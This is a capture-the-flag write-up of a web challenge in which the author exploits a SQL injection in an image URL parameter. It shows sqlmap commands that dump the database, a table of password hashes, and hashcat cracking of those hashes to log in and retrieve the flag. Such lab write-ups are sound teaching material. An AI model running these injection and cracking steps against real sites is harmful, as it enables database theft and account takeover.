Troubles on the bridge: Navigation plan
====================================

## Task
Ahoy, officer,

the chief officer was invited to a naval espresso by the captain and now they are both unfit for duty. The second officer is very busy and he has asked you to find out where are we heading according to the navigation plan.

May you have fair winds and following seas!

The navigation plan webpage is available at http://navigation-plan.cns-jv.tcc.

## Solution
After web protocols my second least favourite challenge as task lead me somewhere when I spent hours of time... and I was completely wrong :-) But, let's see. I've opened link in browser, there is pretty nice web application, with login form, list of targets with picture and some information usually hidden because only logged in users can see it. What to do? First came to my mind SQL injection - there is a login form. But login form probably has correct input sanitization. So something other interesting? Let's look on picture:

	<img src="/image.png?type=data&amp;t=targets&amp;id=4" alt="Map for # Target 4">

Ok, that URL seems interesting, so try SQL injection on it. If someone is so lazy like me, use a tool :-)

	└─$ sqlmap "http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=4"        
	        ___                                                                                                                                                                                              

	[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

	[*] starting @ 10:42:00 /2023-10-18/
	[10:42:00] [INFO] testing connection to the target URL
	you have not declared cookie(s), while server wants to set its own ('PHPSESSID=27c15301ce3...e37e32f9d4'). Do you want to use those [Y/n] 
	[10:42:02] [INFO] checking if the target is protected by some kind of WAF/IPS
	[10:42:03] [INFO] testing if the target URL content is stable
	[10:42:04] [INFO] target URL content is stable
	[10:42:04] [INFO] testing if GET parameter 'type' is dynamic
	[10:42:04] [INFO] GET parameter 'type' appears to be dynamic
	[10:42:04] [INFO] heuristic (basic) test shows that GET parameter 'type' might be injectable (possible DBMS: 'MySQL')
	[10:42:04] [INFO] testing for SQL injection on GET parameter 'type'

Bingo. After little play, if I change type=data to something else, tool will be running much faster (because probably in data is large PNG image...). So we can run this:

	sqlmap "http://navigation-plan.cns-jv.tcc/image.png?type=x&t=users&id=1" --dump-all

and this gives us whole db. sqlmap even ask if it can crack password as he thinks he found some, if we respond yes, table look like this:

	+----+--------+----------+------------------------------------------------------------------------------+----------+
	| id | rank   | active   | password                                                                     | username |
	+----+--------+----------+------------------------------------------------------------------------------+----------+
	| 1  | 1      |          | 15e2b0d3c33891ebb0f1ef609ec419420c20e320ce94c65fbc8c3312448eb225 (123456789) | engeneer |
	| 2  | 0      |          | 7de22a47a2123a21ef0e6db685da3f3b471f01a0b719ef5774d22fed684b2537             | captain  |
	| 3  | 1      |          | 6a4aed6869c8216e463054dcf7e320530b5dc5e05feae6d6d22a4311e3b22ceb             | officer  |
	+----+--------+----------+------------------------------------------------------------------------------+----------+

How to stay here for hours: This is the place when I should stop because I have everything I needed. But no. Login with engeneer account won't work because account is disabled. As application obviously shows information from database, I started looking in it. Dumping all tables, looking inside. I found PNG images in base64 so look there if in base64 in database isn't something more. Isn't...

After several hours of investigating database I've returned to users table. Let's use some other tool for password cracking. So, sqlmap knows that passwords are sha256 hashes, let's try hashcat:

	└─$ echo "7de22a47a2123a21ef0e6db685da3f3b471f01a0b719ef5774d22fed684b2537" >> nav_hashes
	└─$ echo "6a4aed6869c8216e463054dcf7e320530b5dc5e05feae6d6d22a4311e3b22ceb" >> nav_hashes 
	└─$ hashcat -m 1400 nav_hashes /usr/share/wordlists/rockyou.txt 
	...
	7de22a47a2123a21ef0e6db685da3f3b471f01a0b719ef5774d22fed684b2537:$captainamerica$

And here we go... Password for user captain is $captainamerica$
Let's login to website with it. And in details of target #4 is flag:

	FLAG{fmIT-QkuR-FFUv-Zx44}

Obviously flag is in application itself, not in database... so, using better dictionary on start can save a lot of time :-)